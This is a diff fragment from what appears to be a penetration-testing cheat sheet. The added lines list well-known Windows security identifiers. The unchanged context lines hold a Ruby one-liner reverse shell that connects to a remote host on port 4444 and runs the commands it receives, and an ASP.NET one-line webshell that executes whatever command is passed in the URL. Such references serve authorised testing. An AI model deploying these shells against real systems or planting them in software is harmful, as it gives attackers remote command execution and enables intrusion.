@@ -54,3 +54,12 @@ ruby -rsocket -e 'c=TCPSocket.new("123.123.123.1","4444");while(cmd=c.gets);IO.p
 #ASP.net oneliner webshell, thanks to Seguranca-informatica
 #Call by issuing: http://123.123.123.1/shell.asp?cmd=dir
 <%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
+
+----
+
+Well-known-SIDs:
+S-1-0-0                       Nobody        
+S-1-1-0	                      Everybody
+S-1-5-11                      Authenticated Users
+S-1-5-18                      Local System
+S-1-5-domainidentifier-500    Administrator
